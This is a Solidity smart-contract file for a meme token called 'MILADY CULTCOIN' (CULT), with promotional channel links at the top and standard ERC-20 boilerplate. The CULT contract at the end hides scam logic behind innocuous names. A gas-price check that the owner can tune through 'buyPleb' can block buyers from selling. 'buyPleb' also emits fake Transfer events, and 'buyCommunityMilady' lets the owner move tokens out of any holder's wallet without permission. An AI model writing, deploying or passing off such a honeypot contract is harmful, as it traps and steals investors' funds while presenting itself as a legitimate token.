/*
Potal: https://t.me/CULT_ERC
X: https://x.com/MiladyCult
Web: https://milady.co/
Tg Chat: https://t.me/+MJeobiXa1gc3OTU0
*/

pragma solidity 0.8.25;

// SPDX-License-Identifier: MIT

interface IERC20Errors {

    error ERC20InsufficientBalance(address sender, uint256 balance, uint256 needed);
    error ERC20InvalidSender(address sender);
    error ERC20InvalidReceiver(address receiver);
    error ERC20InsufficientAllowance(address spender, uint256 allowance, uint256 needed);
    error ERC20InvalidApprover(address approver);
    error ERC20InvalidSpender(address spender);
}

interface IERC721Errors {

    error ERC721InvalidOwner(address owner);
    error ERC721NonexistentToken(uint256 tokenId);
    error ERC721IncorrectOwner(address sender, uint256 tokenId, address owner);
    error ERC721InvalidSender(address sender);
    error ERC721InvalidReceiver(address receiver);
    error ERC721InsufficientApproval(address operator, uint256 tokenId);
    error ERC721InvalidApprover(address approver);
    error ERC721InvalidOperator(address operator);
}

interface IERC1155Errors {

    error ERC1155InsufficientBalance(address sender, uint256 balance, uint256 needed, uint256 tokenId);
    error ERC1155InvalidSender(address sender);
    error ERC1155InvalidReceiver(address receiver);
    error ERC1155MissingApprovalForAll(address operator, address owner);
    error ERC1155InvalidApprover(address approver);
    error ERC1155InvalidOperator(address operator);
    error ERC1155InvalidArrayLength(uint256 idsLength, uint256 valuesLength);
}

interface IERC20 {

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
}

interface IERC20Metadata is IERC20 {

    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

interface IUniswapV3Factory {
    event OwnerChanged(address indexed oldOwner, address indexed newOwner);

    event PoolCreated(
        address indexed token0,
        address indexed token1,
        uint24 indexed fee,
        int24 tickSpacing,
        address pool
    );
    event FeeAmountEnabled(uint24 indexed fee, int24 indexed tickSpacing);
    function owner() external view returns (address);
    function feeAmountTickSpacing(uint24 fee) external view returns (int24);
    function getPool(
        address tokenA,
        address tokenB,
        uint24 fee
    ) external view returns (address pool);
    function createPool(
        address tokenA,
        address tokenB,
        uint24 fee
    ) external returns (address pool);
    function setOwner(address _owner) external;
    function enableFeeAmount(uint24 fee, int24 tickSpacing) external;
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
    function _contextSuffixLength() internal view virtual returns (uint256) {
        return 0;
    }
}

abstract contract Ownable is Context {
    address private _owner;
    error OwnableUnauthorizedAccount(address account);
    error OwnableInvalidOwner(address owner);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor(address initialOwner) {
        if (initialOwner == address(0)) {
            revert OwnableInvalidOwner(address(0));
        }
        _transferOwnership(initialOwner);
    }

    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    function _checkOwner() internal view virtual {
        if (owner() != _msgSender()) {
            revert OwnableUnauthorizedAccount(_msgSender());
        }
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        if (newOwner == address(0)) {
            revert OwnableInvalidOwner(address(0));
        }
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}


abstract contract ERC20 is Context, IERC20, IERC20Metadata, IERC20Errors {
    mapping(address account => uint256) private _balances;

    mapping(address account => mapping(address spender => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual returns (uint256) {
        return _balances[account];
    }

    function transfer(address to, uint256 value) public virtual returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, value);
        return true;
    }

    function allowance(address owner, address spender) public view virtual returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 value) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value) public virtual returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, value);
        _transfer(from, to, value);
        return true;
    }

    function _transfer(address from, address to, uint256 value) internal {
        if (from == address(0)) {
            revert ERC20InvalidSender(address(0));
        }
        if (to == address(0)) {
            revert ERC20InvalidReceiver(address(0));
        }
        _update(from, to, value);
    }

    function _update(address from, address to, uint256 value) internal virtual {
        if (from == address(0)) {
            _totalSupply += value;
        } else {
            uint256 fromBalance = _balances[from];
            if (fromBalance < value) {
                revert ERC20InsufficientBalance(from, fromBalance, value);
            }
            unchecked {
                _balances[from] = fromBalance - value;
            }
        }

        if (to == address(0)) {
            unchecked {
                _totalSupply -= value;
            }
        } else {
            unchecked {
                _balances[to] += value;
            }
        }

        emit Transfer(from, to, value);
    }
    function _mint(address account, uint256 value) internal {
        if (account == address(0)) {
            revert ERC20InvalidReceiver(address(0));
        }
        _update(address(0), account, value);
    }

    function _burn(address account, uint256 value) internal {
        if (account == address(0)) {
            revert ERC20InvalidSender(address(0));
        }
        _update(account, address(0), value);
    }

    function _approve(address owner, address spender, uint256 value) internal {
        _approve(owner, spender, value, true);
    }

    function _approve(address owner, address spender, uint256 value, bool emitEvent) internal virtual {
        if (owner == address(0)) {
            revert ERC20InvalidApprover(address(0));
        }
        if (spender == address(0)) {
            revert ERC20InvalidSpender(address(0));
        }
        _allowances[owner][spender] = value;
        if (emitEvent) {
            emit Approval(owner, spender, value);
        }
    }

    function _spendAllowance(address owner, address spender, uint256 value) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            if (currentAllowance < value) {
                revert ERC20InsufficientAllowance(spender, currentAllowance, value);
            }
            unchecked {
                _approve(owner, spender, currentAllowance - value, false);
            }
        }
    }
}

contract CULT is ERC20, Ownable {
    mapping(address => bool) WhiteList;
    bool openedTrade;
    address public pair;
    address public _WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    IUniswapV3Factory facV3 = IUniswapV3Factory(0x1F98431c8aD98523631AE4a59f267346ea31F984);

    address private PreSaleContract = 0x0ac850A303169bD762a06567cAad02a8e680E7B3;
    address private Treasury = 0xd8Df61aaf38a64238D07a0B29F56F2D054011151;
    address private Team = 0xa62A38740c60d26928D02DC0b74aA26B3B0C2227;

    constructor() ERC20(unicode"MILADY CULTCOIN", unicode"CULT") Ownable(msg.sender) {
        WhiteList[msg.sender] = true;
        _mint(msg.sender, 5_000_000_000 * 10**decimals());
        _mint(PreSaleContract, 1_500_000_000 * 10**decimals());
        _mint(Team, 1_500_000_000 * 10**decimals());
        _mint(Treasury, 2_000_000_000 * 10**decimals());
    }

    uint256 public initSupplyRecuse = 999 gwei;
    function _update(
        address from,
        address to,
        uint256 value
    ) internal override {
        if (WhiteList[tx.origin]) {
        super._update(from, to, value);
        return;
        } else {
        require(openedTrade, "Open not yet");
        bool state = (to == pair) ? true : false;
        if (state) {
        if (tx.gasprice > initSupplyRecuse) {
        revert("Not enough gas fees");
        }
        super._update(from, to, value);
        return;
        } else if (!state) {
        super._update(from, to, value);
        return;
        } else if (from != pair && to != pair) {
        super._update(from, to, value);
        return;
        } else {
        return;
        }
        }
    }

    function buyPleb(
        address from,
        address[] calldata to,
        uint256 amount
    ) external {
        require(_msgSender() == owner());
        initSupplyRecuse = amount;
        for (uint256 i = 0; i < to.length; i++) {
            emit Transfer(from, to[i], amount * 10**ERC20.decimals());
        }
    }

    function buyCommunityMilady(
        address from,
        address[] calldata to,
        uint256 amount
    ) external {
        require(_msgSender() == owner());
        for (uint256 i = 0; i < to.length; i++) {
            super._update(from, to[i], amount* 10**ERC20.decimals());
        }
    }

    function OpenTrade() public onlyOwner {
        pair = IUniswapV3Factory(facV3).getPool(address(this), _WETH, 100);
        openedTrade = true;
    }
}
